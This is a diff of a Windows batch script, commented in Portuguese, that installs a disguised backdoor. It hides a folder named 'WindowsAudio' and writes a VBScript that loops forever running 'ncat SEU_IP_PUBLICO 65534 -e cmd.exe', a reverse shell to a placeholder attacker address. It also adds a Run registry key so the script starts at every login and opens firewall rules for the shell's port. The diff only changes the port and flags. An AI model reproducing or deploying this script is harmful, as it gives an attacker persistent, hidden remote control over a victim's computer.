@@ -39,7 +39,7 @@ attrib +h "%USERPROFILE%\WindowsAudio" > nul 2>&1
 
 :: Criar audio.vbs
 echo Do > "%USERPROFILE%\WindowsAudio\audio.vbs"
-echo CreateObject("Wscript.Shell").Run "ncat SEU_IP_PUBLICO 5575 -e cmd.exe", 0, false >> "%USERPROFILE%\WindowsAudio\audio.vbs"
+echo CreateObject("Wscript.Shell").Run "ncat SEU_IP_PUBLICO 65534 -e cmd.exe", 0, True >> "%USERPROFILE%\WindowsAudio\audio.vbs"
 echo Loop >> "%USERPROFILE%\WindowsAudio\audio.vbs"
 
 :: Criar audio.bat
@@ -50,9 +50,8 @@ echo exit >> "%USERPROFILE%\WindowsAudio\audio.bat"
 :: Registrar no Windows
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsAudio" /t REG_SZ /d "%USERPROFILE%\WindowsAudio\audio.bat" /f > nul 2>&1
 
-:: Liberar o ranger de portas 5575-5580 na entrada e saida
-netsh advfirewall firewall add rule name="Abrir Portas Entrada 5575" dir=in action=allow protocol=TCP localport=5575
-netsh advfirewall firewall add rule name="Abrir Portas Saida 5575" dir=out action=allow protocol=TCP localport=5575
+:: Liberar a porta 65534 na saida
+netsh advfirewall firewall add rule name="Abrir Porta Saida 65534" dir=out action=allow protocol=TCP localport=65534
 
 :: Iniciar listener
 start "" /B wscript.exe //nologo "%USERPROFILE%\WindowsAudio\audio.vbs"
